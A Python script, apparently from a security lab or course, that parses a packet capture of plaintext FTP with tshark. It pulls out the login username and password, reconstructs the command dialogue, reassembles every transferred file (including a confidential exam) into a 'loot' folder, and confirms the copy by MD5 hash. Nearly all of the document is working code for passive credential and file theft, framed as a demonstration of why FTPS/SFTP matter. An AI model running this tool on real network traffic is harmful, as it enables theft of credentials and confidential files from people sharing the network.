"""
Attacker-side analysis of a captured FTP session.

Given a pcap of plaintext FTP traffic, this reconstructs everything a passive
eavesdropper (someone sharing the network segment / wifi / a tapped link)
would learn:

  1. the login credentials (USER / PASS), recovered verbatim;
  2. the full control-channel dialogue;
  3. every file moved on the data channel, reassembled byte-for-byte,
     including the sensitive exam -- verified against the original.

It leans on tshark's FTP dissector for the control channel and on raw TCP
payload reassembly for the data channel (the FTP data connection carries no
framing of its own, so the payload *is* the file).

Usage:
  extract_secrets.py <pcap> [--port 2121] [--original server_root/exam.txt]
                            [--loot-dir loot]
"""

import argparse
import hashlib
import os
import subprocess
import sys

# Colors are emitted only to a real terminal; when piped/redirected (or
# NO_COLOR is set) they are suppressed so logs stay clean. On Windows,
# os.system("") flips on the console's ANSI-escape handling.
_COLOR = sys.stdout.isatty() and os.environ.get("NO_COLOR") is None
if os.name == "nt" and _COLOR:
    os.system("")
def _ansi(code):
    return code if _COLOR else ""
RED = _ansi("\033[91m"); GRN = _ansi("\033[92m"); YEL = _ansi("\033[93m")
CYN = _ansi("\033[96m"); BOLD = _ansi("\033[1m"); DIM = _ansi("\033[2m")
RST = _ansi("\033[0m")


def tshark(pcap, port, display_filter, fields=None, follow_stream=None):
    cmd = ["tshark", "-r", pcap, "-d", f"tcp.port=={port},ftp"]
    if follow_stream is not None:
        cmd += ["-q", "-z", f"follow,tcp,ascii,{follow_stream}"]
    else:
        cmd += ["-Y", display_filter, "-T", "fields"]
        for f in (fields or []):
            cmd += ["-e", f]
    out = subprocess.run(cmd, capture_output=True, text=True)
    return out.stdout


def rows(text):
    for line in text.splitlines():
        if line.strip() == "":
            continue
        yield line.split("\t")


def reassemble_stream(pcap, port, stream):
    """Byte-exact reassembly of a TCP stream's payload (data-sender side)."""
    hexout = tshark(pcap, port, f"tcp.stream=={stream} && tcp.len>0",
                    fields=["tcp.payload"])
    h = hexout.replace("\n", "").replace(":", "").strip()
    return bytes.fromhex(h) if h else b""


def banner(title):
    print(f"\n{BOLD}{CYN}{'='*66}{RST}")
    print(f"{BOLD}{CYN}  {title}{RST}")
    print(f"{BOLD}{CYN}{'='*66}{RST}")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("pcap")
    ap.add_argument("--port", type=int, default=2121)
    ap.add_argument("--original", default=None,
                    help="path to the real file, to prove exact exfiltration")
    ap.add_argument("--loot-dir", default="loot")
    args = ap.parse_args()

    if not os.path.isfile(args.pcap):
        sys.exit(f"pcap not found: {args.pcap}")
    os.makedirs(args.loot_dir, exist_ok=True)

    print(f"{BOLD}Attacker view: analyzing captured traffic "
          f"{DIM}({args.pcap}){RST}")
    print(f"{DIM}The capture was taken passively -- no interaction with "
          f"the server was needed.{RST}")

    # --- locate the control stream (the one carrying the USER command) ----
    user_rows = list(rows(tshark(args.pcap, args.port,
                                 'ftp.request.command=="USER"',
                                 fields=["tcp.stream"])))
    if not user_rows:
        sys.exit(f"{RED}No FTP control traffic found. Wrong --port?{RST}")
    ctrl_stream = user_rows[0][0]

    # ---------------------------------------------------------------- creds
    banner("1. STOLEN CREDENTIALS  (sent in cleartext)")
    cred = {}
    for r in rows(tshark(args.pcap, args.port,
                         'ftp.request.command=="USER" '
                         '|| ftp.request.command=="PASS"',
                         fields=["ftp.request.command", "ftp.request.arg"])):
        cmd = r[0]
        arg = r[1] if len(r) > 1 else ""
        cred[cmd] = arg
    user = cred.get("USER", "<none>")
    pw = cred.get("PASS", "<none>")
    print(f"   {YEL}username:{RST} {BOLD}{RED}{user}{RST}")
    print(f"   {YEL}password:{RST} {BOLD}{RED}{pw}{RST}")
    with open(os.path.join(args.loot_dir, "credentials.txt"), "w") as fh:
        fh.write(f"host-port\t{args.port}\nusername\t{user}\npassword\t{pw}\n")
    print(f"   {DIM}-> saved to {args.loot_dir}/credentials.txt{RST}")

    # ------------------------------------------------- control conversation
    banner("2. RECONSTRUCTED CONTROL CHANNEL  (what the attacker read)")
    reqs = rows(tshark(args.pcap, args.port, "ftp.request",
                       fields=["ftp.request.command", "ftp.request.arg"]))
    resp = tshark(args.pcap, args.port,
                  "ftp.response.code==227 || ftp.response.code==229",
                  fields=["ftp.response.arg"])
    for r in reqs:
        cmd = r[0]
        if not cmd:
            continue
        arg = r[1] if len(r) > 1 else ""
        flag = ""
        if cmd == "PASS":
            flag = f"   {RED}<-- password in the clear{RST}"
        print(f"   C: {BOLD}{cmd}{RST} {arg}{flag}")
    pasv = [x[0] for x in rows(resp) if x and x[0]]
    if pasv:
        print(f"   {DIM}passive-mode data endpoints advertised by server: "
              f"{', '.join(pasv)}{RST}")

    # -------------------------------------------------------- data channels
    banner("3. EXFILTRATED FILES  (data channel, also cleartext)")
    seen = {}
    for r in rows(tshark(args.pcap, args.port, "ftp-data",
                         fields=["tcp.stream", "ftp-data.command",
                                 "ftp-data.setup-method"])):
        stream = r[0]
        setup_cmd = r[1] if len(r) > 1 else ""
        method = r[2] if len(r) > 2 else ""
        seen.setdefault(stream, (setup_cmd, method))

    if not seen:
        print(f"   {DIM}(no data-channel transfers seen){RST}")
    exam_recovered = None
    for stream, (setup_cmd, method) in sorted(seen.items()):
        data = reassemble_stream(args.pcap, args.port, stream)
        label = setup_cmd or f"stream {stream}"
        print(f"\n   {YEL}transfer:{RST} {BOLD}{label}{RST} "
              f"{DIM}(data stream {stream}, set up via {method}){RST}")
        print(f"   {YEL}recovered:{RST} {len(data)} bytes")
        # Name the loot file after the RETR/STOR target where we can.
        parts = (setup_cmd or "").split()
        fname = parts[-1] if len(parts) >= 2 and parts[0] in (
            "RETR", "STOR", "APPE") else f"stream{stream}.bin"
        outpath = os.path.join(args.loot_dir, "stolen_" + os.path.basename(fname))
        with open(outpath, "wb") as fh:
            fh.write(data)
        print(f"   {DIM}-> saved to {outpath}{RST}")
        if setup_cmd.startswith("RETR"):
            exam_recovered = (outpath, data)
        # show a short preview for text transfers
        try:
            preview = data.decode("utf-8", "replace").splitlines()
            head = [ln for ln in preview if ln.strip()][:3]
            for ln in head:
                print(f"       {DIM}| {ln[:60]}{RST}")
        except Exception:
            pass

    # -------------------------------------------------- integrity proof
    banner("4. PROOF OF EXACT EXFILTRATION")
    if exam_recovered and args.original and os.path.isfile(args.original):
        outpath, data = exam_recovered
        orig = open(args.original, "rb").read()
        om = hashlib.md5(orig).hexdigest()
        rm = hashlib.md5(data).hexdigest()
        print(f"   original  {args.original}: md5={om} ({len(orig)} bytes)")
        print(f"   recovered {outpath}: md5={rm} ({len(data)} bytes)")
        if om == rm:
            print(f"\n   {BOLD}{GRN}MATCH -- the attacker holds a byte-for-byte "
                  f"copy of the exam.{RST}")
        else:
            print(f"\n   {RED}hashes differ (reassembly incomplete?){RST}")
    else:
        print(f"   {DIM}(no RETR capture or --original not given; "
              f"skipping hash comparison){RST}")

    print(f"\n{BOLD}Bottom line:{RST} with only a passive tap, an attacker "
          f"recovered valid login credentials AND the confidential exam.")
    print(f"{DIM}FTPS/SFTP would have encrypted both channels, defeating "
          f"this entirely.{RST}")


if __name__ == "__main__":
    main()
